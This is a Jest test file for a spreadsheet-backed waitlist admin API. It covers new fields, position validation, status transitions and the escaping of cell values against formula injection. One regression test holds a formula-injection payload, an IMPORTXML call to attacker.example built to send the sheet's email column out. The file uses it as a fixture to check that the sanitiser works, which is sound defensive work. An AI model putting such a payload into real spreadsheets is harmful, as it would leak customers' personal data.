'use strict';

// Phase 80, D-17/D-19: behavioural coverage for updateWaitlistStatus's six new optional fields
// (zoho_contact_id, customer_name, customer_phone, recipe_ids, position, contacted_at), plus the
// IN-01 fold-in (status now routed through waitlistCellSafe) and the D-10/D-12/ASVS-V5
// server-side `position` validation.
//
// Harness pattern copied from tests/frontend/adminapi-waitlist-ensure-sheet.test.js
// (makeFakeSheet/makeFakeSpreadsheetApp), extended with getLastRow/getDataRange (as in
// adminapi-waitlist-append-headers.test.js) so findRowById — which reads the sheet the same way
// sheetToObjects does — can actually locate the target row through the fake SpreadsheetApp
// rather than needing a literal parameter-injected stub (findRowById is declared as a top-level
// `function` inside adminApi.gs, so a same-named `new Function` parameter would be shadowed by
// that declaration at call time; feeding it real fake-sheet data is the only way to control its
// return value from outside).
//
// D-05's one-way transition guard and its dedicated coverage live in
// adminapi-waitlist-transition.test.js — untouched here.

var fs = require('fs');
var path = require('path');

var ADMIN_API_PATH = path.join(__dirname, '../../apps-script/adminApi.gs');

var HEADERS = [
  'id', 'email', 'category', 'status', 'signed_up_at', 'mailerlite_synced', 'notes',
  'zoho_contact_id', 'customer_name', 'customer_phone', 'recipe_ids', 'position', 'contacted_at'
];

// --- Fake Sheets runtime -------------------------------------------------------------------

function makeFakeSheet(rows) {
  var grid = rows ? rows.map(function (r) { return r.slice(); }) : [];
  var calls = { setValue: [] };

  return {
    _grid: grid,
    _calls: calls,

    getLastColumn: function () {
      return grid.reduce(function (max, row) {
        return Math.max(max, row.length);
      }, 0);
    },

    getLastRow: function () {
      return grid.length;
    },

    getDataRange: function () {
      return {
        getValues: function () {
          return grid.map(function (r) { return r.slice(); });
        }
      };
    },

    getRange: function (row, col, numRows, numCols) {
      return {
        getValues: function () {
          var nr = numRows === undefined ? 1 : numRows;
          var nc = numCols === undefined ? 1 : numCols;
          var out = [];
          for (var r = 0; r < nr; r++) {
            var src = grid[row - 1 + r] || [];
            var line = [];
            for (var c = 0; c < nc; c++) {
              line.push(src[col - 1 + c] === undefined ? '' : src[col - 1 + c]);
            }
            out.push(line);
          }
          return out;
        },
        setValue: function (value) {
          calls.setValue.push({ row: row, col: col, value: value });
          if (!grid[row - 1]) grid[row - 1] = [];
          grid[row - 1][col - 1] = value;
          return this;
        }
      };
    }
  };
}

function makeFakeSpreadsheetApp(sheetsByName) {
  var sheets = sheetsByName || {};
  return {
    _sheets: sheets,
    getActiveSpreadsheet: function () {
      return {
        getSheetByName: function (name) {
          return Object.prototype.hasOwnProperty.call(sheets, name) ? sheets[name] : null;
        }
      };
    }
  };
}

// Builds a Waitlist row array in HEADERS order from a plain object of overrides.
function waitlistRowArray(overrides) {
  var defaults = {
    id: 'wl-0001',
    email: 'jane@example.com',
    category: 'beer',
    status: 'waiting',
    signed_up_at: '2026-09-02T00:00:00.000Z',
    mailerlite_synced: false,
    notes: '',
    zoho_contact_id: '',
    customer_name: '',
    customer_phone: '',
    recipe_ids: '',
    position: '',
    contacted_at: ''
  };
  if (overrides) {
    for (var k in overrides) {
      if (Object.prototype.hasOwnProperty.call(overrides, k)) defaults[k] = overrides[k];
    }
  }
  return HEADERS.map(function (name) { return defaults[name]; });
}

function loadUpdateWaitlistStatus(spreadsheetApp) {
  var src = fs.readFileSync(ADMIN_API_PATH, 'utf8');
  var factory = new Function(
    'SpreadsheetApp',
    src + '\nreturn {' +
      'updateWaitlistStatus: (typeof updateWaitlistStatus !== "undefined" ? updateWaitlistStatus : undefined)' +
      '};'
  );
  return factory(spreadsheetApp);
}

function makeWaitlistApiWithRow(rowOverrides) {
  var sheet = makeFakeSheet([HEADERS.slice(), waitlistRowArray(rowOverrides)]);
  var app = makeFakeSpreadsheetApp({ Waitlist: sheet });
  var api = loadUpdateWaitlistStatus(app);
  return { api: api, sheet: sheet };
}

function colIndex(name) {
  return HEADERS.indexOf(name) + 1; // 1-based, matches sheet.getRange col
}

// --- Tests ---------------------------------------------------------------------------------

describe('updateWaitlistStatus — six new D-17 fields (behavioural, fake Sheets runtime)', function () {
  test('{id, position: 3} writes the position cell and nothing else', function () {
    var setup = makeWaitlistApiWithRow({ id: 'wl-0001', status: 'waiting' });
    var result = setup.api.updateWaitlistStatus({ id: 'wl-0001', position: 3 });

    expect(result.ok).toBe(true);
    expect(setup.sheet._calls.setValue.length).toBe(1);
    expect(setup.sheet._calls.setValue[0]).toEqual({ row: 2, col: colIndex('position'), value: 3 });
  });

  test("{id, recipe_ids: 'SV-R-000003|SV-R-000007'} writes that cell and nothing else", function () {
    var setup = makeWaitlistApiWithRow({ id: 'wl-0001', status: 'waiting' });
    var result = setup.api.updateWaitlistStatus({ id: 'wl-0001', recipe_ids: 'SV-R-000003|SV-R-000007' });

    expect(result.ok).toBe(true);
    expect(setup.sheet._calls.setValue.length).toBe(1);
    expect(setup.sheet._calls.setValue[0].col).toBe(colIndex('recipe_ids'));
    expect(setup.sheet._calls.setValue[0].value).toBe('SV-R-000003|SV-R-000007');
  });

  test.each([
    ['', ''],
    [null, '']
  ])('{id, position: %p} clears the cell (unpin, D-12) and returns ok', function (input, expectedWritten) {
    var setup = makeWaitlistApiWithRow({ id: 'wl-0001', status: 'waiting', position: 5 });
    var result = setup.api.updateWaitlistStatus({ id: 'wl-0001', position: input });

    expect(result.ok).toBe(true);
    expect(setup.sheet._calls.setValue.length).toBe(1);
    expect(setup.sheet._calls.setValue[0]).toEqual({ row: 2, col: colIndex('position'), value: expectedWritten });
  });

  test.each([
    [0], [-1], ['abc'], [1.5]
  ])('{id, position: %p} returns invalid_position and writes nothing', function (badValue) {
    var setup = makeWaitlistApiWithRow({ id: 'wl-0001', status: 'waiting' });
    var result = setup.api.updateWaitlistStatus({ id: 'wl-0001', position: badValue });

    expect(result).toEqual({ ok: false, error: 'invalid_position' });
    expect(setup.sheet._calls.setValue.length).toBe(0);
  });

  test("{id, customer_name: '=SUM(A1:A2)'} writes a value beginning with an apostrophe (waitlistCellSafe applied)", function () {
    var setup = makeWaitlistApiWithRow({ id: 'wl-0001', status: 'waiting' });
    var result = setup.api.updateWaitlistStatus({ id: 'wl-0001', customer_name: '=SUM(A1:A2)' });

    expect(result.ok).toBe(true);
    expect(setup.sheet._calls.setValue.length).toBe(1);
    expect(setup.sheet._calls.setValue[0].col).toBe(colIndex('customer_name'));
    expect(String(setup.sheet._calls.setValue[0].value).charAt(0)).toBe("'");
  });

  test("{id, status: 'contacted'} on a waiting row writes a waitlistCellSafe-processed status and returns ok", function () {
    var setup = makeWaitlistApiWithRow({ id: 'wl-0001', status: 'waiting' });
    var result = setup.api.updateWaitlistStatus({ id: 'wl-0001', status: 'contacted' });

    expect(result).toEqual({ ok: true, id: 'wl-0001', status: 'contacted' });
    expect(setup.sheet._calls.setValue.length).toBe(1);
    expect(setup.sheet._calls.setValue[0].col).toBe(colIndex('status'));
    // waitlistCellSafe leaves ordinary text unchanged (no leading =+-@), so it still reads
    // 'contacted' — this proves the write goes THROUGH the sanitizer, not that it changes shape.
    expect(setup.sheet._calls.setValue[0].value).toBe('contacted');
  });

  test("{id, status: 'waiting'} on a booked row still returns invalid_transition and writes nothing", function () {
    var setup = makeWaitlistApiWithRow({ id: 'wl-0001', status: 'booked' });
    var result = setup.api.updateWaitlistStatus({ id: 'wl-0001', status: 'waiting' });

    expect(result).toEqual({ ok: false, error: 'invalid_transition' });
    expect(setup.sheet._calls.setValue.length).toBe(0);
  });

  test('a payload with none of the nine optional fields returns no_fields', function () {
    var setup = makeWaitlistApiWithRow({ id: 'wl-0001', status: 'waiting' });
    var result = setup.api.updateWaitlistStatus({ id: 'wl-0001' });

    expect(result).toEqual({ ok: false, error: 'no_fields' });
    expect(setup.sheet._calls.setValue.length).toBe(0);
  });

  test('zoho_contact_id and customer_phone also route through waitlistCellSafe', function () {
    var setup = makeWaitlistApiWithRow({ id: 'wl-0001', status: 'waiting' });
    var result = setup.api.updateWaitlistStatus({
      id: 'wl-0001',
      zoho_contact_id: '+1234',
      customer_phone: '-6045551234'
    });

    expect(result.ok).toBe(true);
    expect(setup.sheet._calls.setValue.length).toBe(2);
    setup.sheet._calls.setValue.forEach(function (call) {
      expect(String(call.value).charAt(0)).toBe("'");
    });
  });

  test('contacted_at writes the caller-supplied ISO string verbatim', function () {
    var setup = makeWaitlistApiWithRow({ id: 'wl-0001', status: 'waiting' });
    var iso = '2026-09-04T12:00:00.000Z';
    var result = setup.api.updateWaitlistStatus({ id: 'wl-0001', contacted_at: iso });

    expect(result.ok).toBe(true);
    expect(setup.sheet._calls.setValue.length).toBe(1);
    expect(setup.sheet._calls.setValue[0]).toEqual({ row: 2, col: colIndex('contacted_at'), value: iso });
  });

  // CR-02 regression. contacted_at was the only one of the six new columns written
  // without waitlistCellSafe(). update_waitlist_status is on ADMIN_PROXY_ACTIONS and
  // the proxy forwards the client's whole body, so this field IS client-reachable —
  // "only the server sets it" was not true. An unsanitized =IMPORTXML(...) would be
  // evaluated by Sheets on the shared production spreadsheet and could exfiltrate the
  // whole email column.
  test('contacted_at routes through waitlistCellSafe — a formula payload is neutralized', function () {
    var setup = makeWaitlistApiWithRow({ id: 'wl-0001', status: 'waiting' });
    var payload = '=IMPORTXML("https://attacker.example/?d="&ENCODEURL(JOIN(",",B2:B999)),"//x")';
    var result = setup.api.updateWaitlistStatus({ id: 'wl-0001', contacted_at: payload });

    expect(result.ok).toBe(true);
    expect(setup.sheet._calls.setValue.length).toBe(1);
    var written = setup.sheet._calls.setValue[0];
    expect(written.col).toBe(colIndex('contacted_at'));
    // Leading apostrophe forces Sheets to treat the cell as literal text, never a formula.
    expect(String(written.value).charAt(0)).toBe("'");
  });

  test.each([
    ['+1'], ['-1'], ['@import']
  ])('contacted_at: %p is prefixed rather than written raw', function (badValue) {
    var setup = makeWaitlistApiWithRow({ id: 'wl-0001', status: 'waiting' });
    var result = setup.api.updateWaitlistStatus({ id: 'wl-0001', contacted_at: badValue });

    expect(result.ok).toBe(true);
    expect(String(setup.sheet._calls.setValue[0].value).charAt(0)).toBe("'");
  });
});
